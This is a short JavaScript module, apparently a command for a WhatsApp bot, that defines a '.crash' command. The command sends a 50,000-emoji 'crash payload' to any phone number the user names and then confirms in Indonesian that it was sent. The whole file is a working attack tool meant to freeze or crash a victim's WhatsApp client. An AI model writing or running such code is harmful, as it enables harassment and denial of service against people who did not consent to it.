module.exports = {
  name: 'crash',
  execute: async (client, message, args) => {
    const target = args[0];
    if (!target) {
      return message.reply('👑 Format: .crash [target]');
    }

    const crashPayload = '👑'.repeat(50000);
    await client.sendMessage(target + '@s.whatsapp.net', { text: crashPayload });

    return message.reply(`👑 Crash payload berhasil dikirim ke ${target}.`);
  }
};
